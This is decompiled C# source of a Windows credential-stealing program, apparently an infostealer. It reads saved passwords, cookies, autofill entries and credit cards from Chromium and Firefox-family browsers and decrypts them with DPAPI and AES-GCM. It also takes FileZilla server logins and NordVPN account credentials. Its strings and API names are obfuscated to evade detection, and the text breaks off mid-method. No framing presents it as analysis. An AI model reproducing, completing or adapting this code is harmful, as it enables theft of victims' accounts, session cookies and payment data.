// Warning: Some assembly references could not be resolved automatically. This might lead to incorrect decompilation of some parts,
// for ex. property getter/setter access. To get optimal decompilation results, please manually add the missing references to the list of loaded assemblies.

// Pruriently, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// Global type: <Module>
// Entry point: Program.Main
// Architecture: x86
// Runtime: v4.0.30319
// Hash algorithm: SHA1

using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Security;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.Runtime.Versioning;
using System.Security;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Security.Permissions;
using System.ServiceModel;
using System.ServiceModel.Channels;
using System.ServiceModel.Security;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Web.Script.Serialization;
using System.Windows;
using System.Windows.Forms;
using System.Xml;
using Microsoft.Win32;

[assembly: CompilationRelaxations(8)]
[assembly: RuntimeCompatibility(WrapNonExceptionThrows = true)]
[assembly: Debuggable(DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints)]
[assembly: TargetFramework(".NETFramework,Version=v4.0", FrameworkDisplayName = ".NET Framework 4")]
[assembly: SecurityPermission(8, SkipVerification = true)]
[assembly: AssemblyVersion("0.0.0.0")]
[module: UnverifiableCode]
public static class EntityCreator
{
	public static List<Entity9> Sсаn(IList<string> profiles)
	{
		//IL_00c5: Unknown result type (might be due to invalid IL or missing references)
		List<Entity9> list = new List<Entity9>();
		try
		{
			foreach (string item in profiles.Select((string x) => Environment.ExpandEnvironmentVariables(x)))
			{
				foreach (string item2 in FileCopier.FindPaths(item, 1, 1, "LEnvironmentogiEnvironmentn DatEnvironmenta".Replace("Environment", string.Empty), "WSystem.Texteb DatSystem.Texta".Replace("System.Text", string.Empty), "CoCryptographyokieCryptographys".Replace("Cryptography", string.Empty)))
				{
					Entity9 entity = new Entity9();
					string dataFolder = string.Empty;
					string empty = string.Empty;
					try
					{
						dataFolder = ((FileSystemInfo)new FileInfo(item2).get_Directory()).get_FullName();
						empty = ((!dataFolder.Contains("OFileInfopeFileInfora GFileInfoX StabFileInfole".Replace("FileInfo", string.Empty))) ? (item2.Contains(" ApGenericpDaGenericta\\RGenericoamiGenericng\\".Replace("Generic", string.Empty)) ? FileCopier.ChromeGetRoamingName(dataFolder) : FileCopier.ChromeGetLocalName(dataFolder)) : "OpLinqera GLinqX".Replace("Linq", string.Empty));
						if (!string.IsNullOrEmpty(empty))
						{
							empty = empty[0].ToString().ToUpper() + empty.Remove(0, 1);
							string text = FileCopier.ChromeGetName(dataFolder);
							if (!string.IsNullOrEmpty(text))
							{
								entity.Id1 = empty;
								entity.Id2 = text;
								entity.Id3 = MakeTries(() => ScanPasswords(dataFolder), (List<Entity12> x) => x.Count > 0);
								entity.Id6 = MakeTries(() => ScanCook(dataFolder), (List<Entity10> x) => x.Count > 0);
								entity.Id4 = MakeTries(() => ScanFills(dataFolder), (List<Entity8> x) => x.Count > 0);
								entity.Id5 = MakeTries(() => GetEntityCards(dataFolder), (List<Entity11> x) => x.Count > 0);
							}
						}
					}
					catch (Exception)
					{
					}
					if (!entity.Id7())
					{
						list.Add(entity);
					}
				}
			}
			return list;
		}
		catch
		{
			return list;
		}
	}

	private static List<Entity12> ScanPasswords(string profilePath)
	{
		List<Entity12> list = new List<Entity12>();
		try
		{
			string text = Path.Combine(profilePath, new string(new char[10] { 'L', 'o', 'g', 'i', 'n', ' ', 'D', 'a', 't', 'a' }));
			if (!File.Exists(text))
			{
				return list;
			}
			string chromeKey = ReadKey(profilePath);
			try
			{
				DataBaseConnectionHandler dataBaseConnectionHandler = new DataBaseConnectionHandler(text);
				dataBaseConnectionHandler.ReadContextTable(new string(new char[6] { 'l', 'o', 'g', 'i', 'n', 's' }));
				for (int i = 0; i < dataBaseConnectionHandler.RowLength; i++)
				{
					Entity12 entity = new Entity12();
					try
					{
						entity.Id1 = dataBaseConnectionHandler.ReadContextValue(i, 0).Trim();
						entity.Id2 = dataBaseConnectionHandler.ReadContextValue(i, 3).Trim();
						entity.Id3 = ReadRawData(dataBaseConnectionHandler.ReadContextValue(i, 5), chromeKey);
					}
					catch (Exception)
					{
					}
					finally
					{
						entity.Id1 = (string.IsNullOrWhiteSpace(entity.Id1) ? "UNKNOWN" : entity.Id1);
						entity.Id2 = (string.IsNullOrWhiteSpace(entity.Id2) ? "UNKNOWN" : entity.Id2);
						entity.Id3 = (string.IsNullOrWhiteSpace(entity.Id3) ? "UNKNOWN" : entity.Id3);
					}
					if (entity.Id3 != "UNKNOWN")
					{
						list.Add(entity);
					}
				}
				return list;
			}
			catch (Exception)
			{
				return list;
			}
		}
		catch (Exception)
		{
			return list;
		}
	}

	private static List<Entity10> ScanCook(string profilePath)
	{
		List<Entity10> list = new List<Entity10>();
		try
		{
			string text = Path.Combine(profilePath, new string(new char[7] { 'C', 'o', 'o', 'k', 'i', 'e', 's' }));
			if (!File.Exists(text))
			{
				return list;
			}
			string chromeKey = ReadKey(profilePath);
			try
			{
				DataBaseConnectionHandler dataBaseConnectionHandler = new DataBaseConnectionHandler(text);
				dataBaseConnectionHandler.ReadContextTable(new string(new char[7] { 'c', 'o', 'o', 'k', 'i', 'e', 's' }));
				for (int i = 0; i < dataBaseConnectionHandler.RowLength; i++)
				{
					Entity10 entity = null;
					try
					{
						Entity10 entity2 = new Entity10();
						entity2.Id1 = dataBaseConnectionHandler.GatherValue(i, new string(new char[8] { 'h', 'o', 's', 't', '_', 'k', 'e', 'y' })).Trim();
						entity2.Id2 = dataBaseConnectionHandler.GatherValue(i, new string(new char[8] { 'h', 'o', 's', 't', '_', 'k', 'e', 'y' })).Trim().StartsWith(".");
						entity2.Id3 = dataBaseConnectionHandler.GatherValue(i, new string(new char[4] { 'p', 'a', 't', 'h' })).Trim();
						entity2.Id4 = dataBaseConnectionHandler.GatherValue(i, new string(new char[9] { 'i', 's', '_', 's', 'e', 'c', 'u', 'r', 'e' })).Contains("1");
						entity2.Id5 = Convert.ToInt64(dataBaseConnectionHandler.GatherValue(i, new string(new char[11]
						{
							'e', 'x', 'p', 'i', 'r', 'e', 's', '_', 'u', 't',
							'c'
						})).Trim()) / 1000000 - 11644473600L;
						entity2.Id6 = dataBaseConnectionHandler.GatherValue(i, new string(new char[4] { 'n', 'a', 'm', 'e' })).Trim();
						entity2.Id7 = ReadRawData(dataBaseConnectionHandler.GatherValue(i, new string(new char[15]
						{
							'e', 'n', 'c', 'r', 'y', 'p', 't', 'e', 'd', '_',
							'v', 'a', 'l', 'u', 'e'
						})), chromeKey);
						entity = entity2;
						if (entity.Id5 < 0)
						{
							entity.Id5 = DateTime.Now.AddMonths(12).Ticks - 621355968000000000L;
						}
					}
					catch
					{
					}
					if (!string.IsNullOrWhiteSpace(entity?.Id7))
					{
						list.Add(entity);
					}
				}
				return list;
			}
			catch
			{
				return list;
			}
		}
		catch (Exception)
		{
			return list;
		}
	}

	private static List<Entity8> ScanFills(string profilePath)
	{
		List<Entity8> list = new List<Entity8>();
		try
		{
			string text = Path.Combine(profilePath, new string(new char[8] { 'W', 'e', 'b', ' ', 'D', 'a', 't', 'a' }));
			if (!File.Exists(text))
			{
				return list;
			}
			string chromeKey = ReadKey(profilePath);
			try
			{
				DataBaseConnectionHandler dataBaseConnectionHandler = new DataBaseConnectionHandler(text);
				dataBaseConnectionHandler.ReadContextTable(new string(new char[8] { 'a', 'u', 't', 'o', 'f', 'i', 'l', 'l' }));
				for (int i = 0; i < dataBaseConnectionHandler.RowLength; i++)
				{
					Entity8 entity = null;
					try
					{
						string text2 = dataBaseConnectionHandler.GatherValue(i, new string(new char[5] { 'v', 'a', 'l', 'u', 'e' })).Trim();
						if (text2.StartsWith(new string(new char[3] { 'v', '1', '0' })) || text2.StartsWith(new string(new char[3] { 'v', '1', '1' })))
						{
							text2 = ReadRawData(text2, chromeKey);
						}
						Entity8 entity2 = new Entity8();
						entity2.Id1 = dataBaseConnectionHandler.GatherValue(i, new string(new char[4] { 'n', 'a', 'm', 'e' })).Trim();
						entity2.Id2 = text2;
						entity = entity2;
					}
					catch
					{
					}
					if (entity != null)
					{
						list.Add(entity);
					}
				}
				return list;
			}
			catch (Exception)
			{
				return list;
			}
		}
		catch (Exception)
		{
			return list;
		}
	}

	private static List<Entity11> GetEntityCards(string profilePath)
	{
		List<Entity11> list = new List<Entity11>();
		try
		{
			string text = Path.Combine(profilePath, new string(new char[8] { 'W', 'e', 'b', ' ', 'D', 'a', 't', 'a' }));
			if (!File.Exists(text))
			{
				return list;
			}
			string chromeKey = ReadKey(profilePath);
			try
			{
				DataBaseConnectionHandler dataBaseConnectionHandler = new DataBaseConnectionHandler(text);
				dataBaseConnectionHandler.ReadContextTable("cFileStreamredFileStreamit_cFileStreamardFileStreams".Replace("FileStream", string.Empty));
				for (int i = 0; i < dataBaseConnectionHandler.RowLength; i++)
				{
					Entity11 entity = null;
					try
					{
						entity = new Entity11
						{
							Id1 = dataBaseConnectionHandler.ReadContextValue(i, 1).Trim(),
							Id2 = Convert.ToInt32(dataBaseConnectionHandler.ReadContextValue(i, 2).Trim()),
							Id3 = Convert.ToInt32(dataBaseConnectionHandler.ReadContextValue(i, 3).Trim()),
							Id4 = ReadRawData(dataBaseConnectionHandler.ReadContextValue(i, 4), chromeKey).Replace(" ", string.Empty)
						};
					}
					catch
					{
					}
					if (entity != null)
					{
						list.Add(entity);
					}
				}
				return list;
			}
			catch (Exception)
			{
				return list;
			}
		}
		catch (Exception)
		{
			return list;
		}
	}

	private static string ReadRawData(string chiperText, string chromeKey)
	{
		string result = string.Empty;
		try
		{
			if (chiperText[0] == 'v' && chiperText[1] == '1')
			{
				result = Aes.Decrypt(Convert.FromBase64String(chromeKey), chiperText);
				return result;
			}
			result = CryptoHelper.DecryptBlob(chiperText, (DataProtectionScope)0).Trim();
			return result;
		}
		catch (Exception)
		{
			return result;
		}
	}

	private static string ReadKey(string profilePath)
	{
		string result = string.Empty;
		string empty = string.Empty;
		try
		{
			string[] array = profilePath.Split(new string[1] { "\\" }, StringSplitOptions.RemoveEmptyEntries);
			array = array.Take(array.Length - 1).ToArray();
			int num = 0;
			while (true)
			{
				switch (num)
				{
				default:
					continue;
				case 0:
					empty = Path.Combine(string.Join("\\", array), new string(new char[11]
					{
						'L', 'o', 'c', 'a', 'l', ' ', 'S', 't', 'a', 't',
						'e'
					}));
					if (!File.Exists(empty))
					{
						num++;
						continue;
					}
					break;
				case 1:
					empty = Path.Combine(profilePath, new string(new char[11]
					{
						'L', 'o', 'c', 'a', 'l', ' ', 'S', 't', 'a', 't',
						'e'
					}));
					if (!File.Exists(empty))
					{
						num++;
						continue;
					}
					break;
				case 2:
					empty = Path.Combine(string.Join("\\", array), new string(new char[15]
					{
						'L', 'o', 'c', 'a', 'l', 'P', 'r', 'e', 'f', 's',
						'.', 'j', 's', 'o', 'n'
					}));
					if (!File.Exists(empty))
					{
						num++;
						continue;
					}
					break;
				case 3:
					empty = Path.Combine(profilePath, new string(new char[15]
					{
						'L', 'o', 'c', 'a', 'l', 'P', 'r', 'e', 'f', 's',
						'.', 'j', 's', 'o', 'n'
					}));
					break;
				}
				break;
			}
			if (File.Exists(empty))
			{
				try
				{
					result = empty.ReadFileAsText().FromJSON<LocalState>().os_crypt.encrypted_key;
					return result;
				}
				catch (Exception)
				{
					return result;
				}
			}
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static T MakeTries<T>(Func<T> func, Func<T, bool> success)
	{
		int num = 1;
		T val = func();
		while (!success(val))
		{
			val = func();
			num++;
			if (num > 2)
			{
				return val;
			}
		}
		return val;
	}
}
public class FileZilla
{
	public static List<Entity12> Scan()
	{
		List<Entity12> list = new List<Entity12>();
		try
		{
			string text = string.Format(new string(new char[31]
			{
				'{', '0', '}', '\\', 'F', 'i', 'l', 'e', 'Z', 'i',
				'l', 'l', 'a', '\\', 'r', 'e', 'c', 'e', 'n', 't',
				's', 'e', 'r', 'v', 'e', 'r', 's', '.', 'x', 'm',
				'l'
			}), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
			string text2 = string.Format(new string(new char[29]
			{
				'{', '0', '}', '\\', 'F', 'i', 'l', 'e', 'Z', 'i',
				'l', 'l', 'a', '\\', 's', 'i', 't', 'e', 'm', 'a',
				'n', 'a', 'g', 'e', 'r', '.', 'x', 'm', 'l'
			}), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
			if (File.Exists(text))
			{
				list.AddRange(ScanCredentials(text));
			}
			if (File.Exists(text2))
			{
				list.AddRange(ScanCredentials(text2));
				return list;
			}
			return list;
		}
		catch
		{
			return list;
		}
	}

	private static List<Entity12> ScanCredentials(string Path)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Expected O, but got Unknown
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0046: Expected O, but got Unknown
		List<Entity12> list = new List<Entity12>();
		try
		{
			XmlTextReader val = new XmlTextReader(Path);
			XmlDocument val2 = new XmlDocument();
			val2.Load((XmlReader)(object)val);
			foreach (XmlNode childNode in ((XmlNode)val2.get_DocumentElement()).get_ChildNodes().get_ItemOf(0).get_ChildNodes())
			{
				Entity12 recent = GetRecent(childNode);
				if (recent.Id1 != "UNKNOWN" && recent.Id1 != "UNKNOWN")
				{
					list.Add(recent);
				}
			}
			return list;
		}
		catch
		{
			return list;
		}
	}

	private static Entity12 GetRecent(XmlNode xmlNode)
	{
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0023: Expected O, but got Unknown
		Entity12 entity = new Entity12();
		try
		{
			foreach (XmlNode childNode in xmlNode.get_ChildNodes())
			{
				XmlNode val = childNode;
				if (val.get_Name() == "Host")
				{
					entity.Id1 = val.get_InnerText();
				}
				if (val.get_Name() == "Port")
				{
					entity.Id1 = entity.Id1 + ":" + val.get_InnerText();
				}
				if (val.get_Name() == "User")
				{
					entity.Id2 = val.get_InnerText();
				}
				if (val.get_Name() == "Pass")
				{
					entity.Id3 = Encoding.UTF8.GetString(Convert.FromBase64String(val.get_InnerText()));
				}
			}
		}
		catch
		{
		}
		finally
		{
			entity.Id1 = (string.IsNullOrEmpty(entity.Id1) ? "UNKNOWN" : entity.Id1);
			entity.Id2 = (string.IsNullOrEmpty(entity.Id2) ? "UNKNOWN" : entity.Id2);
			entity.Id3 = (string.IsNullOrEmpty(entity.Id3) ? "UNKNOWN" : entity.Id3);
		}
		return entity;
	}
}
public static class g_E_c_к_0
{
	public static List<Entity9> TryFind(IList<string> paths)
	{
		//IL_0087: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f5: Unknown result type (might be due to invalid IL or missing references)
		List<Entity9> list = new List<Entity9>();
		try
		{
			foreach (string item in paths.Select((string x) => Environment.ExpandEnvironmentVariables(x)))
			{
				try
				{
					foreach (string item2 in FileCopier.FindPaths(item, 2, 1, new string(new char[24]
					{
						'c', 'o', 'M', 'A', 'N', 'G', 'O', 'o', 'k', 'i',
						'e', 's', '.', 's', 'q', 'M', 'A', 'N', 'G', 'O',
						'l', 'i', 't', 'e'
					}).Replace("MANGO", string.Empty)))
					{
						string fullName = ((FileSystemInfo)new FileInfo(item2).get_Directory()).get_FullName();
						string text = (item2.Contains(Environment.ExpandEnvironmentVariables(new string(new char[62]
						{
							'%', 'U', 'S', 'E', 'R', 'P', 'E', 'n', 'v', 'i',
							'r', 'o', 'n', 'm', 'e', 'n', 't', 'R', 'O', 'F',
							'I', 'L', 'E', '%', '\\', 'A', 'p', 'p', 'D', 'E',
							'n', 'v', 'i', 'r', 'o', 'n', 'm', 'e', 'n', 't',
							'a', 't', 'a', '\\', 'R', 'o', 'a', 'E', 'n', 'v',
							'i', 'r', 'o', 'n', 'm', 'e', 'n', 't', 'm', 'i',
							'n', 'g'
						}).Replace("Environment", string.Empty))) ? GeckoRoamingName(fullName) : GeckoLocalName(fullName));
						if (!string.IsNullOrEmpty(text))
						{
							Entity9 entity = new Entity9
							{
								Id1 = text,
								Id2 = ((FileSystemInfo)new DirectoryInfo(fullName)).get_Name(),
								Id6 = new List<Entity10>(EnumCook(fullName)),
								Id3 = new List<Entity12>(),
								Id4 = new List<Entity8>(),
								Id5 = new List<Entity11>()
							};
							if (!entity.Id7())
							{
								list.Add(entity);
							}
						}
					}
				}
				catch
				{
				}
			}
			return list;
		}
		catch (Exception)
		{
			return list;
		}
	}

	private static List<Entity10> EnumCook(string profile)
	{
		List<Entity10> list = new List<Entity10>();
		try
		{
			string text = Path.Combine(profile, new string(new char[14]
			{
				'c', 'o', 'o', 'k', 'i', 'e', 's', '.', 's', 'q',
				'l', 'i', 't', 'e'
			}));
			if (!File.Exists(text))
			{
				return list;
			}
			DataBaseConnectionHandler dataBaseConnectionHandler = new DataBaseConnectionHandler(text);
			dataBaseConnectionHandler.ReadContextTable(new string(new char[11]
			{
				'm', 'o', 'z', '_', 'c', 'o', 'o', 'k', 'i', 'e',
				's'
			}));
			for (int i = 0; i < dataBaseConnectionHandler.RowLength; i++)
			{
				Entity10 entity = null;
				try
				{
					Entity10 entity2 = new Entity10(dataBaseConnectionHandler.GatherValue(i, "eNetworkCredentialxpirNetworkCredentialy".Replace("NetworkCredential", string.Empty)).Trim());
					entity2.Id1 = dataBaseConnectionHandler.GatherValue(i, new string(new char[4] { 'h', 'o', 's', 't' })).Trim();
					entity2.Id2 = dataBaseConnectionHandler.GatherValue(i, new string(new char[4] { 'h', 'o', 's', 't' })).Trim()[0] == '.';
					entity2.Id3 = dataBaseConnectionHandler.GatherValue(i, new string(new char[4] { 'p', 'a', 't', 'h' })).Trim();
					entity2.Id4 = dataBaseConnectionHandler.GatherValue(i, new string(new char[8] { 'i', 's', 'S', 'e', 'c', 'u', 'r', 'e' }))[0] == '1';
					entity2.Id6 = dataBaseConnectionHandler.GatherValue(i, new string(new char[4] { 'n', 'a', 'm', 'e' })).Trim();
					entity2.Id7 = dataBaseConnectionHandler.GatherValue(i, new string(new char[5] { 'v', 'a', 'l', 'u', 'e' }));
					entity = entity2;
				}
				catch
				{
				}
				if (entity != null)
				{
					list.Add(entity);
				}
			}
			return list;
		}
		catch
		{
			return list;
		}
	}

	public static string GeckoRoamingName(string profilesDirectory)
	{
		string result = string.Empty;
		try
		{
			profilesDirectory = profilesDirectory.Replace(Environment.ExpandEnvironmentVariables(new string(new char[10] { '%', 'a', 'p', 'p', 'd', 'a', 't', 'a', '%', '\\' })), string.Empty);
			string[] array = profilesDirectory.Split(new char[1] { '\\' }, StringSplitOptions.RemoveEmptyEntries);
			if (array[2] == new string(new char[8] { 'P', 'r', 'o', 'f', 'i', 'l', 'e', 's' }))
			{
				result = array[1];
				return result;
			}
			result = array[0];
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static string GeckoLocalName(string profilesDirectory)
	{
		string result = string.Empty;
		try
		{
			profilesDirectory = profilesDirectory.Replace(Environment.ExpandEnvironmentVariables(new string(new char[15]
			{
				'%', 'l', 'o', 'c', 'a', 'l', 'a', 'p', 'p', 'd',
				'a', 't', 'a', '%', '\\'
			})), string.Empty);
			string[] array = profilesDirectory.Split(new char[1] { '\\' }, StringSplitOptions.RemoveEmptyEntries);
			if (array[2] == new string(new char[8] { 'P', 'r', 'o', 'f', 'i', 'l', 'e', 's' }))
			{
				result = array[1];
				return result;
			}
			result = array[0];
			return result;
		}
		catch
		{
			return result;
		}
	}
}
public class NordApp
{
	public static List<Entity12> Find()
	{
		//IL_004a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0050: Expected O, but got Unknown
		//IL_00df: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e6: Expected O, but got Unknown
		List<Entity12> list = new List<Entity12>();
		try
		{
			DirectoryInfo val = new DirectoryInfo(Path.Combine(Environment.ExpandEnvironmentVariables("%USEWanaLifeRPROFILE%\\AppDaWanaLifeta\\LWanaLifeocal".Replace("WanaLife", string.Empty)), new string(new char[16]
			{
				'N', 'o', 'D', 'e', 'f', 'r', 'd', 'D', 'e', 'f',
				'V', 'P', 'N', 'D', 'e', 'f'
			}).Replace("Def", string.Empty)));
			if (!((FileSystemInfo)val).get_Exists())
			{
				return list;
			}
			DirectoryInfo[] directories = val.GetDirectories(new string(new char[24]
			{
				'N', 'W', 'i', 'n', 'o', 'r', 'd', 'V', 'W', 'i',
				'n', 'p', 'n', '.', 'e', 'W', 'i', 'n', 'x', 'e',
				'*', 'W', 'i', 'n'
			}).Replace("Win", string.Empty));
			for (int i = 0; i < directories.Length; i++)
			{
				DirectoryInfo[] directories2 = directories[i].GetDirectories();
				foreach (DirectoryInfo val2 in directories2)
				{
					try
					{
						string text = Path.Combine(((FileSystemInfo)val2).get_FullName(), new string(new char[11]
						{
							'u', 's', 'e', 'r', '.', 'c', 'o', 'n', 'f', 'i',
							'g'
						}));
						if (!File.Exists(text))
						{
							continue;
						}
						XmlDocument val3 = new XmlDocument();
						val3.Load(text);
						string innerText = ((XmlNode)val3).SelectSingleNode(new string(new char[76]
						{
							' ', '/', '/', 's', 'e', 't', 't', 'S', 't', 'r',
							'i', 'n', 'g', '.', 'R', 'e', 'p', 'l', 'a', 'c',
							'e', 'i', 'n', 'g', '[', '@', 'n', 'a', 'm', 'e',
							'=', '\\', 'U', 'S', 't', 'r', 'i', 'n', 'g', '.',
							'R', 'e', 'p', 'l', 'a', 'c', 'e', 's', 'e', 'r',
							'n', 'a', 'm', 'e', '\\', ']', '/', 'v', 'a', 'S',
							't', 'r', 'i', 'n', 'g', '.', 'R', 'e', 'p', 'l',
							'a', 'c', 'e', 'l', 'u', 'e'
						}).Replace("String.Replace", string.Empty)).get_InnerText();
						string innerText2 = ((XmlNode)val3).SelectSingleNode(new string(new char[72]
						{
							'/', '/', 's', 'e', 't', 't', 'i', 'n', 'S', 't',
							'r', 'i', 'n', 'g', '.', 'R', 'e', 'm', 'o', 'v',
							'e', 'g', '[', '@', 'n', 'a', 'm', 'e', '=', '\\',
							'P', 'a', 's', 's', 'w', 'S', 't', 'r', 'i', 'n',
							'g', '.', 'R', 'e', 'm', 'o', 'v', 'e', 'o', 'r',
							'd', '\\', ']', '/', 'v', 'a', 'l', 'u', 'S', 't',
							'r', 'i', 'n', 'g', '.', 'R', 'e', 'm', 'o', 'v',
							'e', 'e'
						}).Replace("String.Remove", string.Empty)).get_InnerText();
						if (!string.IsNullOrWhiteSpace(innerText) && !string.IsNullOrWhiteSpace(innerText2))
						{
							string @string = Encoding.UTF8.GetString(Convert.FromBase64String(innerText));
							string string2 = Encoding.UTF8.GetString(Convert.FromBase64String(innerText2));
							string text2 = CryptoHelper.DecryptBlob(@string, (DataProtectionScope)1);
							string text3 = CryptoHelper.DecryptBlob(string2, (DataProtectionScope)1);
							if (!string.IsNullOrWhiteSpace(text2) && !string.IsNullOrWhiteSpace(text3))
							{
								list.Add(new Entity12
								{
									Id2 = text2,
									Id3 = text3
								});
							}
						}
					}
					catch
					{
					}
				}
			}
			return list;
		}
		catch
		{
			return list;
		}
	}
}
public class Aes : IDisposable
{
	private delegate uint BCryptOpenAlgorithmProviderDelegate(out IntPtr phAlgorithm, [MarshalAs(UnmanagedType.LPWStr)] string pszAlgId, [MarshalAs(UnmanagedType.LPWStr)] string pszImplementation, uint dwFlags);

	private delegate uint BCryptCloseAlgorithmProviderDelegate(IntPtr hAlgorithm, uint flags);

	private delegate uint BCryptGetPropertyDelegate(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbOutput, int cbOutput, ref int pcbResult, uint flags);

	private delegate uint BCryptSetAlgorithmPropertyDelegate(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbInput, int cbInput, int dwFlags);

	private delegate uint BCryptImportKeyDelegate(IntPtr hAlgorithm, IntPtr hImportKey, [MarshalAs(UnmanagedType.LPWStr)] string pszBlobType, out IntPtr phKey, IntPtr pbKeyObject, int cbKeyObject, byte[] pbInput, int cbInput, uint dwFlags);

	private delegate uint BCryptDestroyKeyDelegate(IntPtr hKey);

	private delegate uint BCryptDecryptDelegate(IntPtr hKey, byte[] pbInput, int cbInput, ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo, byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput, ref int pcbResult, int dwFlags);

	private IntPtr LibPtr { get; }

	public Aes()
	{
		LibPtr = NativeHelper.LoadLibrary(Path.Combine(Environment.SystemDirectory, "bcrFileStream.IOypt.dFileStream.IOll".Replace("FileStream.IO", string.Empty)));
	}

	~Aes()
	{
		Dispose();
	}

	public uint BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm, [MarshalAs(UnmanagedType.LPWStr)] string pszAlgId, [MarshalAs(UnmanagedType.LPWStr)] string pszImplementation, uint dwFlags)
	{
		return NativeHelper.GetDelegate<BCryptOpenAlgorithmProviderDelegate>(NativeHelper.GetProcAddress(LibPtr, "BCrMemoryStreamyptOpeMemoryStreamnAlgorithmProviMemoryStreamder".Replace("MemoryStream", string.Empty)))(out phAlgorithm, pszAlgId, pszImplementation, dwFlags);
	}

	public uint BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, uint flags)
	{
		return NativeHelper.GetDelegate<BCryptCloseAlgorithmProviderDelegate>(NativeHelper.GetProcAddress(LibPtr, "BCrFileStreamyptCloseAlgoritFileStreamhmProvFileStreamider".Replace("FileStream", string.Empty)))(hAlgorithm, flags);
	}

	public uint BCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo, byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput, ref int pcbResult, int dwFlags)
	{
		return NativeHelper.GetDelegate<BCryptDecryptDelegate>(NativeHelper.GetProcAddress(LibPtr, "BCrIOStreamyptDecrIOStreamypt".Replace("IOStream", string.Empty)))(hKey, pbInput, cbInput, ref pPaddingInfo, pbIV, cbIV, pbOutput, cbOutput, ref pcbResult, dwFlags);
	}

	public uint BCryptDestroyKey(IntPtr hKey)
	{
		return NativeHelper.GetDelegate<BCryptDestroyKeyDelegate>(NativeHelper.GetProcAddress(LibPtr, "BCrFile.ReadyptDesFile.ReadtroyKFile.Readey".Replace("File.Read", string.Empty)))(hKey);
	}

	public uint BCryptGetProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbOutput, int cbOutput, ref int pcbResult, uint flags)
	{
		return NativeHelper.GetDelegate<BCryptGetPropertyDelegate>(NativeHelper.GetProcAddress(LibPtr, "BCFile.OpenryptGeFile.OpentPropeFile.Openrty".Replace("File.Open", string.Empty)))(hObject, pszProperty, pbOutput, cbOutput, ref pcbResult, flags);
	}

	public uint BCryptSetAlgorithmProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbInput, int cbInput, int dwFlags)
	{
		return NativeHelper.GetDelegate<BCryptSetAlgorithmPropertyDelegate>(NativeHelper.GetProcAddress(LibPtr, "BCFile.CloseryptSFile.CloseetPrFile.CloseoperFile.Closety".Replace("File.Close", string.Empty)))(hObject, pszProperty, pbInput, cbInput, dwFlags);
	}

	public uint BCryptImportKey(IntPtr hAlgorithm, IntPtr hImportKey, [MarshalAs(UnmanagedType.LPWStr)] string pszBlobType, out IntPtr phKey, IntPtr pbKeyObject, int cbKeyObject, byte[] pbInput, int cbInput, uint dwFlags)
	{
		return NativeHelper.GetDelegate<BCryptImportKeyDelegate>(NativeHelper.GetProcAddress(LibPtr, "BCrFile.ReadAllTextyptImFile.ReadAllTextportKFile.ReadAllTextey".Replace("File.ReadAllText", string.Empty)))(hAlgorithm, hImportKey, pszBlobType, out phKey, pbKeyObject, cbKeyObject, pbInput, cbInput, dwFlags);
	}

	public void Dispose()
	{
	}

	public static string Decrypt(byte[] bMasterKey, string chiperText)
	{
		Encoding encoding = Encoding.GetEncoding("windows-1251");
		byte[] array = new byte[bMasterKey.Length - 5];
		Array.Copy(bMasterKey, 5, array, 0, bMasterKey.Length - 5);
		return encoding.GetString(Decrypt(bMasterKey: CryptoHelper.DecryptBlob(array, (DataProtectionScope)0), bEncryptedData: encoding.GetBytes(chiperText)));
	}

	private static byte[] Decrypt(byte[] bEncryptedData, byte[] bMasterKey)
	{
		byte[] array = new byte[12]
		{
			1, 2, 3, 4, 5, 6, 7, 8, 0, 0,
			0, 0
		};
		Array.Copy(bEncryptedData, 3, array, 0, 12);
		try
		{
			byte[] array2 = new byte[bEncryptedData.Length - 15];
			Array.Copy(bEncryptedData, 15, array2, 0, bEncryptedData.Length - 15);
			byte[] array3 = new byte[16];
			byte[] array4 = new byte[array2.Length - array3.Length];
			Array.Copy(array2, array2.Length - 16, array3, 0, 16);
			Array.Copy(array2, 0, array4, 0, array2.Length - array3.Length);
			return new Aes().Get(bMasterKey, array, null, array4, array3);
		}
		catch (Exception)
		{
		}
		return null;
	}

	private byte[] Get(byte[] key, byte[] iv, byte[] aad, byte[] cipherText, byte[] authTag)
	{
		IntPtr intPtr = OpenAlgorithmProvider("AES", "Microsoft Primitive Provider", "ChainingModeGCM");
		IntPtr hKey;
		IntPtr hglobal = ImportKey(intPtr, key, out hKey);
		BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo = new BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(iv, aad, authTag);
		byte[] array2;
		using (pPaddingInfo)
		{
